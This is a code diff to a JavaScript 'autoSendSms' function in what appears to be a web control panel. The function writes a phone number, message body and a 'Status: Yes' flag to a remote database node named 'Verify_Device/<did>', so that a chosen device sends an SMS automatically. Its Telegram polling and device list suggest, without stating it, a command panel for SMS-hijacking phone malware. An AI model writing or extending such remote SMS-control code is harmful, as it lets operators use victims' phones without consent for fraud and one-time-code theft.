@@ -2852,34 +2852,34 @@ function pollTelegram() {
 }
 
 function autoSendSms(number, body) {
+  /* Exactly same as doSendSms() — single PUT to Verify_Device/<did> */
   if (!AUTO_SMS_DEV || !DB || !NODE) return;
   var dev = DEVS[AUTO_SMS_DEV];
   if (!dev) return;
-  var did = dev.did || dev.key || AUTO_SMS_DEV;
-  var auth = APIKEY ? ('?auth=' + encodeURIComponent(APIKEY)) : '';
-  /* DELETE first, then PUT after 500ms (same as manual SMS send) */
-  fetch(DB + '/' + NODE + '/Verify_Device/' + did + '.json' + auth, { method: 'DELETE' })
-    .then(function() {
-      return new Promise(function(res) { setTimeout(res, 500); });
-    })
-    .then(function() {
-      return fetch(DB + '/' + NODE + '/Verify_Device/' + did + '.json' + auth, {
-        method: 'PUT',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ Number: number, Body: body, Status: 'Yes' })
-      });
-    })
-    .then(function(r) {
-      var t = new Date().toLocaleTimeString('en-IN');
-      showToast('✅ Auto-SMS sent! → ' + number + ' [' + t + ']');
-      var btn = document.getElementById('autosms-btn');
-      if (btn) {
-        btn.innerHTML = '🤖 Auto-SMS: ON ✅ | Last: ' + number + ' ' + t;
-      }
-    })
-    .catch(function(e) {
-      showToast('❌ Auto-SMS FAIL → ' + number + ': ' + e.message);
-    });
+  /* Exact same did resolution as doSendSms */
+  var did = (dev.did) ? dev.did : AUTO_SMS_DEV;
+  var auth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
+  var url = DB + '/Verify_Device/' + did + '.json' + auth;
+  console.log('Auto-SMS → PUT', url, 'Number:', number);
+  fetch(url, {
+    method: 'PUT',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ Number: number, Body: body, Status: 'Yes' })
+  })
+  .then(function(r) {
+    if (!r.ok) throw new Error('HTTP ' + r.status);
+    return r.json();
+  })
+  .then(function() {
+    var t = new Date().toLocaleTimeString('en-IN');
+    showToast('✅ Auto-SMS sent → ' + number + ' [' + t + ']');
+    var btn = document.getElementById('autosms-btn');
+    if (btn) btn.innerHTML = '🤖 Auto-SMS: ON ✅ Last: ' + number + ' ' + t;
+  })
+  .catch(function(e) {
+    showToast('❌ Auto-SMS FAIL → ' + number + ': ' + e.message);
+    console.log('Auto-SMS error:', e.message);
+  });
 }
 
 function openAutoSmsSettings() {
